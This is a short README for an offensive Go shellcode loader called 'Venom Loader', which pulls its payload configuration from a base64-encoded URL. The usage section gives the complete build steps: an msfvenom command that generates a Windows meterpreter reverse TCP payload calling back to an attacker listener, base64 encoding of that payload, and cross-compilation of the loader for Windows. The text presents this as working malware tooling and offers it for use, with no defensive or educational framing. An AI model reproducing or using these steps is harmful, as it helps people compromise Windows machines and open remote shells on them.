
# Venom Loader

A tiny shellcode loader I am having fun with. It reads a JSON file from a base64 encoded URL. It works rather nicely and works mostly as advertised.




## Usage/Examples
Modify the main.go and instr file to suit your situation before doing any of the below.
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LISTENER_IP> LPORT=<LISTENER_PORT> -f raw -o WHATEVER.bin
base64 WHATEVER.bin > WHATEVERb64.bin
export GOOS=windows;export GOARCH=amd64 #Only if compiling on linux for windows
go build
```
At this point the loader as well as a basic payload should be ready.




## To-Do

- Make a builder script that simplifys creation of the JSON and binary. Current one is bricked. Rewrite in python.
- Remove dependancy on https://github.com/D3Ext/maldev/ to reduce built binary size.
- Come up with a better name for the damned thing.
